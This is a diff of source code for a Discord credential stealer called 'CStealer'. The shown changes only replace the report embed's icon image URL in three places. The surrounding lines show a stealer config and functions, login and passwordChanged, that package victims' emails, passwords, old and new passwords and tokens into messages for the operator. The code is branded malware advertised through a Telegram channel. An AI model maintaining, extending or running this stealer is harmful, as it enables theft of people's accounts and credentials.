@@ -11,7 +11,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'CStealer', 
-  embed_icon: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
+  embed_icon: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
   embed_color: 000000,
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
@@ -651,7 +651,7 @@ const login = async (email, password, token) => {
           text: 'CStealer | t.me/cstealerr',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
+          url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
@@ -696,7 +696,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         text: 'CStealer | t.me/cstealerr',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
+          url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
